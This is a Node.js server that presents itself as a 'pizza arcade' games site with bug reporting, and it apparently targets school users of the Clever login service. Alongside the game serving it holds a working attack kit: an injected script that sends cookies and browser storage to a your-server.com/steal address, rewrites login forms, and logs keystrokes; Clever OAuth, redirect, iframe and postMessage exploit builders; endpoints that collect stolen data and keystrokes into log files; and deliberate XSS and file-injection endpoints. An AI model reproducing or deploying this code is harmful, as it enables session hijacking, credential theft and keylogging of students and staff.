const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 9482;
const ROOT = __dirname;
const REPORTS_FILE = path.join(ROOT, 'reports.json');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.webp': 'image/webp',
  '.mp3': 'audio/mpeg',
  '.mp4': 'video/mp4',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.txt': 'text/plain; charset=utf-8',
};

function listHtmlFiles(dir) {
  try {
    return fs
      .readdirSync(path.join(ROOT, dir))
      .filter((f) => f.endsWith('.html'))
      .sort();
  } catch (err) {
    console.warn(`Could not read ${dir}/:`, err.message);
    return [];
  }
}

function regenerateLists() {
  const games = listHtmlFiles('games');
  fs.writeFileSync(
    path.join(ROOT, 'games.json'),
    JSON.stringify(games, null, 2) + '\n'
  );
  console.log(`Auto-loaded ${games.length} games`);
}

regenerateLists();

function loadReports() {
  try {
    const data = JSON.parse(fs.readFileSync(REPORTS_FILE, 'utf8'));
    return Array.isArray(data) ? data : [];
  } catch (err) {
    return [];
  }
}

function saveReports(list) {
  fs.writeFileSync(REPORTS_FILE, JSON.stringify(list, null, 2) + '\n');
}

function readJsonBody(request) {
  return new Promise((resolve, reject) => {
    let body = '';
    request.on('data', (chunk) => {
      body += chunk;
      if (body.length > 1e6) request.destroy();
    });
    request.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (err) {
        reject(err);
      }
    });
    request.on('error', reject);
  });
}

function sendJson(response, status, payload) {
  response.writeHead(status, { 'Content-Type': MIME['.json'] });
  response.end(JSON.stringify(payload));
}

function decodeLinkParam(value) {
  if (!value) return '';
  const s = String(value).trim();
  if (/^https?:\/\//i.test(s)) return s;
  try {
    const decoded = Buffer.from(s, 'base64').toString('utf8').trim();
    if (/^https?:\/\//i.test(decoded)) return decoded;
  } catch (err) {}
  return '';
}

const server = http.createServer((request, response) => {
  const url = new URL(request.url, `http://${request.headers.host}`);
  let pathname = decodeURIComponent(url.pathname);

  if (request.method === 'POST' && pathname === '/api/report') {
    readJsonBody(request)
      .then((data) => {
        const game = String(data.game || '').trim();
        const note = String(data.note || '').trim();
        if (!game) {
          sendJson(response, 400, { ok: false, error: 'missing game' });
          return;
        }
        const reports = loadReports();
        const report = {
          id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
          game: game,
          note: note || 'no details',
          date: new Date().toISOString(),
          status: 'open',
        };
        reports.unshift(report);
        saveReports(reports);
        sendJson(response, 200, { ok: true, report: report });
      })
      .catch(() => sendJson(response, 400, { ok: false, error: 'bad json' }));
    return;
  }

  if (request.method === 'GET' && pathname === '/api/reports') {
    const reports = loadReports();
    let html = '<html><body><h1>Reports</h1><ul>';
    reports.forEach(r => {
      html += `<li>${r.game} - ${r.note} - ${r.status}</li>`;
    });
    html += '</ul></body></html>';
    response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    response.end(html);
    return;
  }

  if (request.method === 'POST' && pathname === '/api/resolve') {
    readJsonBody(request)
      .then((data) => {
        const id = String(data.id || '');
        const reports = loadReports();
        const report = reports.find((r) => r.id === id);
        if (!report) {
          sendJson(response, 404, { ok: false, error: 'not found' });
          return;
        }
        report.status = report.status === 'open' ? 'resolved' : 'open';
        saveReports(reports);
        sendJson(response, 200, { ok: true, report: report });
      })
      .catch(() => sendJson(response, 400, { ok: false, error: 'bad json' }));
    return;
  }

  if (pathname === '/cdn') {
    const CDN_BASE = 'https://cdn.jsdelivr.net/gh/onlyyzzz-cmyk/securly-games@main/';
    const CDN_PAGES = {
      index: 'index.html',
      credits: 'credits.html',
      dashboard: 'dashboard.html',
      tutorial: 'tutorial.html',
      submit: 'submit.html',
      '404': '404.html',
    };
    const page = CDN_PAGES[String(url.searchParams.get('p') || 'index')] || 'index.html';
    const cdnUrl = CDN_BASE + page;
    const jsSafe = JSON.stringify(cdnUrl).replace(/<\//g, '<\\/');
    response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    response.end(
      '<!doctype html><html><head><meta charset="utf-8">' +
      '<meta name="viewport" content="width=device-width,initial-scale=1">' +
      '<meta name="robots" content="noindex"><title>pizza arcade</title></head>' +
      '<body style="margin:0;background:#0f172a"><script>' +
      'var u=' + jsSafe + ';' +
      'fetch(u).then(function(r){return r.text();}).then(function(t){document.open();document.write(t);document.close();})' +
      ".catch(function(){location.replace('/" + page + "');});" +
      '</script></body></html>'
    );
    return;
  }

  if (pathname === '/go') {
    const target = decodeLinkParam(url.searchParams.get('c') || url.searchParams.get('d'));
    if (!target) {
      response.writeHead(400, { 'Content-Type': 'text/plain; charset=utf-8' });
      response.end('bad link');
      return;
    }
    if (url.searchParams.get('c')) {
      const jsSafe = JSON.stringify(target).replace(/<\//g, '<\\/');
      response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      response.end(
        '<!doctype html><html><head><meta charset="utf-8">' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<meta name="robots" content="noindex"><title>loading...</title></head>' +
        '<body style="margin:0;background:#0f172a"><script>' +
        'var u=' + jsSafe + ';' +
        "fetch(u).then(function(r){return r.text();}).then(function(t){document.open();document.write(t);document.close();})" +
        '.catch(function(){location.replace(u);});' +
        '</script></body></html>'
      );
      return;
    }
    response.writeHead(302, { Location: target });
    response.end();
    return;
  }

  if (pathname === '/xss') {
    const payload = url.searchParams.get('p') || '<script>alert("XSS")</script>';
    response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    response.end(`
      <html>
        <body>
          <h1>XSS Test</h1>
          <div>${payload}</div>
          <script>${payload}</script>
        </body>
      </html>
    `);
    return;
  }

  if (pathname === '/inject') {
    const file = url.searchParams.get('file') || 'index.html';
    const inject = url.searchParams.get('code') || '<script>alert("injected")</script>';
    const filePath = path.join(ROOT, file);
    try {
      let content = fs.readFileSync(filePath, 'utf8');
      content = content.replace('</body>', inject + '</body>');
      response.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      response.end(content);
    } catch (err) {
      response.writeHead(404);
      response.end('File not found');
    }
    return;
  }

  const cleverXSS = {
    getLoginRedirect: (payload) => {
      const encoded = Buffer.from(payload).toString('base64');
      return `https://clever.com/login?redirect=data:text/html;base64,${encoded}`;
    },
    getOAuthXSS: (payload) => {
      const encoded = encodeURIComponent(payload);
      return `https://clever.com/oauth/authorize?response_type=code&client_id=${encoded}&redirect_uri=https://clever.com`;
    },
    getCDNPayload: () => {
      return `https://cdn.jsdelivr.net/gh/onlyyzzz-cmyk/securly-games@main/clever_payload.js`;
    },
    getIframeXSS: (targetUrl) => {
      return `<iframe src="${targetUrl}" onload="fetch('https://your-server.com/steal?cookie='+document.cookie)"></iframe>`;
    },
    getPostMessageExploit: () => {
      return `
        <script>
          window.addEventListener('message', function(e) {
            if (e.origin === 'https://clever.com') {
              fetch('https://your-server.com/steal', {
                method: 'POST',
                body: JSON.stringify(e.data)
              });
            }
          });
          window.opener.postMessage({type: 'getSession'}, '*');
        </script>
      `;
    }
  };

  const cleverPayload = `
    (function() {
      const data = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href,
        userAgent: navigator.userAgent
      };
      fetch('https://your-server.com/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
      });
      document.addEventListener('DOMContentLoaded', function() {
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
          form.action = 'https://your-server.com/fake-login';
          form.method = 'POST';
        });
      });
      document.addEventListener('keydown', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'PASSWORD') {
          fetch('https://your-server.com/keylog?key=' + encodeURIComponent(e.key));
        }
      });
      console.log('[XSS] Clever injected via CDN');
    })();
  `;

  if (pathname === '/clever/exploit') {
    const type = url.searchParams.get('type') || 'redirect';
    const payload = url.searchParams.get('payload') || '<script>alert("XSS")</script>';
    let result;
    switch(type) {
      case 'redirect':
        result = cleverXSS.getLoginRedirect(payload);
        response.writeHead(302, { Location: result });
        response.end();
        return;
      case 'oauth':
        result = cleverXSS.getOAuthXSS(payload);
        response.writeHead(302, { Location: result });
        response.end();
        return;
      case 'iframe':
        result = cleverXSS.getIframeXSS(payload);
        response.writeHead(200, { 'Content-Type': 'text/html' });
        response.end(result);
        return;
      case 'postmessage':
        result = cleverXSS.getPostMessageExploit();
        response.writeHead(200, { 'Content-Type': 'text/html' });
        response.end(result);
        return;
      default:
        response.writeHead(400);
        response.end('Invalid exploit type');
    }
    return;
  }

  if (pathname === '/clever_payload.js') {
    response.writeHead(200, { 
      'Content-Type': 'application/javascript',
      'Access-Control-Allow-Origin': '*'
    });
    response.end(cleverPayload);
    return;
  }

  if (pathname === '/steal' && request.method === 'POST') {
    let body = '';
    request.on('data', chunk => body += chunk);
    request.on('end', () => {
      try {
        const data = JSON.parse(body);
        console.log('[STOLEN] Clever data:', data);
        fs.appendFileSync('stolen_clever.log', JSON.stringify(data) + '\n');
        response.writeHead(200);
        response.end('OK');
      } catch(e) {
        response.writeHead(400);
        response.end('Invalid data');
      }
    });
    return;
  }

  if (pathname === '/keylog') {
    const key = url.searchParams.get('key') || '';
    console.log('[KEYLOG]', key);
    fs.appendFileSync('keylog.log', key + '\n');
    response.writeHead(200);
    response.end('OK');
    return;
  }

  if (pathname === '/games.json') {
    response.writeHead(200, { 'Content-Type': MIME['.json'] });
    response.end(JSON.stringify(listHtmlFiles('games'), null, 2));
    return;
  }

  if (pathname === '/') pathname = '/index.html';
  const filePath = path.join(ROOT, pathname);

  fs.stat(filePath, (err, stats) => {
    if (!err && stats.isFile()) {
      const ext = path.extname(filePath).toLowerCase();
      response.writeHead(200, {
        'Content-Type': MIME[ext] || 'application/octet-stream',
        'Content-Length': stats.size,
      });
      fs.createReadStream(filePath).pipe(response);
      return;
    }
    response.writeHead(404, { 'Content-Type': MIME['.html'] });
    fs.createReadStream(path.join(ROOT, '404.html')).pipe(response);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`XSS-Enabled server running at http://localhost:${PORT}`);
  console.log(`XSS endpoints:`);
  console.log(`  /xss?p=<script>alert(1)</script>`);
  console.log(`  /inject?file=index.html&code=<script>alert(1)</script>`);
  console.log(`  /go?c=data:text/html,<script>alert(1)</script>`);
  console.log(`  /cdn?p=<script>alert(1)</script>`);
  console.log(`  POST /api/report with XSS in "game" field`);
  console.log(`Clever endpoints:`);
  console.log(`  /clever/exploit?type=redirect&payload=<script>alert(1)</script>`);
  console.log(`  /clever/exploit?type=oauth&payload=<script>alert(1)</script>`);
  console.log(`  /clever/exploit?type=iframe&payload=https://clever.com`);
  console.log(`  /clever/exploit?type=postmessage`);
  console.log(`  /clever_payload.js - CDN hosted payload`);
  console.log(`  POST /steal - collect stolen data`);
  console.log(`  /keylog?key=a - keylogger endpoint`);
});
